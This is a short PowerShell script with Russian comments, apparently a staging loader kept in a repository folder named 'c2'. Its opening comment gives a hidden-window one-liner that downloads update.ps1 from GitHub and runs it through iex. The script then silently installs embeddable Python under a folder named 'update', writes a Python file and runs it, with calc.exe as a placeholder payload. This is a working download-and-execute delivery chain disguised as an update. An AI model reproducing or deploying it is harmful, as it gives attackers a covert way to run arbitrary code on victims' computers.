# powershell -NoP -NonI -w h -c "irm https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2/update.ps1 | iex"
# Папка куда сохранить Python 
$InstallPath = "C:\Tools\update"

# URL официального embeddable package
$Url = "https://www.python.org/ftp/python/3.13.14/python-3.13.14-embed-amd64.zip"

# Временный файл
$ZipFile = "$env:TEMP\python-embed.zip"

# Создать папку
New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null

# Скачать
Write-Host "Downloading Python..."
Invoke-WebRequest -Uri $Url -OutFile $ZipFile

# Распаковать
Write-Host "Extracting..."
Expand-Archive -Path $ZipFile -DestinationPath $InstallPath -Force

# Удалить архив
Remove-Item $ZipFile

# Проверка
Write-Host "Python version:"
& "$InstallPath\python.exe" --version

Write-Host "Done:"
Write-Host $InstallPath

$ScriptPath = Join-Path $InstallPath "start.py"

# Содержимое файла start.py (с объявлением переменной a)
$PythonCode = @"
import subprocess

subprocess.run(["calc.exe"])
"@

# Создать файл start.py в кодировке UTF8
Set-Content -Path $ScriptPath -Value $PythonCode -Encoding UTF8

# Запустить python.exe и передать ему start.py
Write-Host "Running start.py..."
Set-Location $InstallPath
.\python.exe start.py
